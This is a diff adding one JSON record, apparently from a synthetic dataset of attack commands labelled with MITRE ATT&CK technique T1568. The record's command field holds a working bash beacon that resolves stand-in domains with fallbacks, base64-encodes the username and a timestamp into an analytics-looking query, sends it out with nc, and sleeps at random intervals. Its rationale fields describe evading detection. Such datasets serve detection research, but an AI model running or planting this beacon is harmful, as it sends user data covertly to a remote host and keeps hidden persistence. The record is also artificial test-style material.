@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "bash -c \"while true; do host=metrics.example.org; ip=''; for h in \\\"$host\\\" cdn-metrics.example.org assets.example.net; do ip=$(dig +short \\\"$h\\\" | shuf -n1); if [ -n \\\"$ip\\\" ]; then host=\\\"$h\\\"; break; fi; done; ua=\\\"Mozilla/5.0 (X11; Linux)\\\"; ts=$(date -u +%s); q=\\\"q=$(printf '%s:%s' \\\"$USER\\\" \\\"$ts\\\" | base64 -w0)\\\"; printf 'GET /collect?%s HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: %s\\r\\nConnection: close\\r\\n\\r\\n' \\\"$q\\\" \\\"$host\\\" \\\"$ua\\\" | nc -w 5 \\\"$ip\\\" 80; sleep $((RANDOM%60+120)); done\"",
+  "explanation": "Sets up a periodic beacon that re-resolves a preferred domain each cycle with fallback domains to maintain persistence; sends base64 data in a query string to mimic analytics collection.",
+  "rationale_steps": [
+    "Continuously re-resolve C2 host at runtime to track fast-changing IPs.",
+    "Fallback to secondary domains when resolution fails.",
+    "Use realistic HTTP GET with query params and standard headers.",
+    "Randomize sleep intervals to blend with user activity patterns."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-213026ff-654de9c0",
+  "source_prompt_hash": "213026ff",
+  "timestamp_utc": "2025-09-30T03:23:47.812011Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
